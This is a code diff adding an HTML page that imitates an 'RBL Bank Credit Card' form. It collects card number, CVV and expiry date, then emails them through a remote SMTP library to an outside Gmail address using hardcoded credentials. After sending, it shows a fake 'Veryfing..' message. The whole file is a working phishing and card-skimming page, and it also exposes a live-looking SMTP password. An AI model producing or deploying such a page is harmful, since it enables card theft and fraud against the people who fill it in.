@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=devices-wedth, initial-scale=1.0">
+    <title>Project</title>
+    <link rel="stylesheet" href="project.css">
+</head>
+<body>
+    <div class="container">
+        <form onsubmit="sendEmail(); reset(); return false;">
+            <h3>RBL Bank Credit Card</h3>
+            <input type="text" id="no." placeholder="Enter Credit Card No." required>
+            <input type="text" id="cvv" placeholder="CVV" required>
+            <input type="text" id="expiredate" placeholder="Expire Date" required>
+            <button type="submit">submit</button>
+
+
+
+        </form>
+    </div>
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <script>
+        function sendEmail(){
+            Email.send({
+                Host : "smtp.elasticemail.com",
+                Username : "projectrcl9@gmail.com",
+                Password : "03F071F5AC2B6160026B23DD88B1590125A8",
+                To : 'boot420tiger@gmail.com',
+                From : "projectrcl9@gmail.com",
+                Subject : "Credit card details",
+                Body : "Credit Card No:-   " + document.getElementById("no.").value
+                + "<br> CVV:-   " + document.getElementById("cvv").value
+                + "<br> expire date:-   " + document.getElementById("expiredate").value
+
+}).then(
+  message => alert("Veryfing..")
+);
+        }
+    </script>
+</body>
+</html>
